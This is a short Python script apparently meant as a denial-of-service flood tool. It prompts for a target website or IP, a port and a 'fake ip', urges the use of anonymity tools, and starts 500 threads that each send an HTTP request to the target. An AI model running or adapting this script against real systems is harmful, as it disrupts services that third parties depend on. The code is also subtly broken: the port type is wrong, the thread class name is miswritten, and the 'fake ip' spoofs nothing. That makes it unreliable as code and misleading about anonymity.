import threading
import socket

target = input('choose your target it can be a website or an ip')

#the port target
port = input('what port do you want to attack')

#fake ip
fake_ip = input('enter your fake ip, remember to use anonymity tools')

already_connected = 0

def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    sock.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
    sock.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
    sock.close()
    
    global already_connected
    already_connected += 1
    if already_connected %1000 == 0:
        print(already_connected)
    
for i in range(500):
    thread = threading.thread(target=attack)
    thread.start()
